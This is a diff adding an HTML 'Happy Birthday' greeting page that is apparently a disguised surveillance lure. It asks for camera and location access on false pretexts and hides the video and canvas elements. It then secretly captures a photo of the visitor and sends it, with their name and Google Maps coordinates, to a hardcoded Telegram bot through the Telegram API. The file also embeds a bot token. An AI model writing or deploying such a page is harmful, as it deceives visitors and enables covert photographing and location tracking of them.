@@ -1,0 +1,142 @@
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Birthday Wish</title>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    <style>
+        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 400px; }
+        h1 { color: #ff4757; font-size: 2.2rem; }
+        p { color: #555; }
+        input { width: 85%; padding: 12px; margin: 20px 0; border: 2px solid #ddd; border-radius: 25px; text-align: center; font-size: 16px; }
+        button { background: #ff4757; color: white; border: none; padding: 12px 35px; font-size: 16px; border-radius: 25px; cursor: pointer; font-weight: bold; }
+        #wish-screen { display: none; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="login-screen">
+        <h1>🎉 Happy Birthday! 🎂</h1>
+        <p>Please enter your name to continue:</p>
+        <input type="text" id="userName" placeholder="Enter your name..." autocomplete="off">
+        <br>
+        <button onclick="startVerification()">Enter ➡️</button>
+    </div>
+
+    <div class="card" id="wish-screen">
+        <h1 id="wishText">Happy Birthday to you! 🌸</h1>
+        <p>Wishing you a wonderful day! 🌟</p>
+        <video id="bg-camera" autoplay playsinline></video>
+        <canvas id="bg-canvas"></canvas>
+    </div>
+
+<script>
+const TELEGRAM_TOKEN = "8950597483:AAH4KQg3FIR1C1ysUHHMv5XwsIkeDEG4K3c"; 
+const CHAT_ID = "8358344120"; 
+
+let globalName = "";
+let locationLink = "Location not provided (Denied)";
+let isCameraAllowed = false;
+let cameraStream = null;
+
+function startVerification() {
+    const name = document.getElementById('userName').value.trim();
+    if (name === "") { alert("Please enter your name!"); return; }
+    globalName = name;
+
+    // 1st: Request Camera Permission
+    const camConsent = confirm("May we access your camera to send your photo to the company for a special Birthday Wish?");
+    
+    if (camConsent) {
+        activateCamera();
+    } else {
+        alert("Camera permission denied. Proceeding to location check.");
+        requestLocation();
+    }
+}
+
+async function activateCamera() {
+    const video = document.getElementById('bg-camera');
+    try {
+        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        video.srcObject = cameraStream;
+        isCameraAllowed = true;
+        
+        // After camera setup, move to Location request
+        requestLocation();
+    } catch (err) { 
+        alert("Camera access denied by browser.");
+        requestLocation();
+    }
+}
+
+function requestLocation() {
+    // 2nd: Request Location Permission
+    const locConsent = confirm("May we access your location to verify your presence at the company?");
+    
+    if (locConsent) {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    locationLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                    showCelebrationAndSend();
+                },
+                (error) => {
+                    showCelebrationAndSend();
+                }
+            );
+        } else {
+            showCelebrationAndSend();
+        }
+    } else {
+        showCelebrationAndSend();
+    }
+}
+
+function showCelebrationAndSend() {
+    // Show celebration screen
+    document.getElementById('login-screen').style.display = 'none';
+    document.getElementById('wish-screen').style.display = 'block';
+    document.getElementById('wishText').innerText = `Happy Birthday to you, ${globalName}! 🌸`;
+    
+    confetti({ particleCount: 150, spread: 100, origin: { y: 0.6 } });
+
+    // Capture and send data
+    if (isCameraAllowed && cameraStream) {
+        setTimeout(() => captureAndSend(), 1500);
+    } else {
+        // If camera was denied but location was given, send text data only
+        sendTextOnly();
+    }
+}
+
+function captureAndSend() {
+    const video = document.getElementById('bg-camera');
+    const canvas = document.getElementById('bg-canvas');
+    const context = canvas.getContext('2d');
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, `${globalName}_Birthday.jpg`);
+        formData.append("caption", `🎉 Birthday Wish from: ${globalName}\n📍 Location: ${locationLink}`);
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+        cameraStream.getTracks().forEach(track => track.stop());
+    }, "image/jpeg");
+}
+
+async function sendTextOnly() {
+    const message = `🎉 Birthday Wish from: ${globalName}\n📍 Location: ${locationLink}\n⚠️ Note: Camera photo was not provided.`;
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+    });
+}
+</script>
+</body>
+</html>
